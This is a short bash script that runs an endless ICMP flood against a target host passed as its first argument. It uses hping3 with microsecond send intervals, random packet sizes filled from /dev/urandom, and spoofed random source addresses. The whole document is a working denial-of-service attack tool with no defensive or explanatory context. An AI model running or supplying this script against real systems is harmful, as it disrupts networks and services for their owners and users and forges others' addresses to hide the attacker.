#!/bin/bash

while true;
do
    PACKSIZE=`shuf -i 500-1500 -n 1`;
    hping3 --icmp -i u1 -c 500 -d $PACKSIZE --file /dev/urandom --rand-source $1;
done

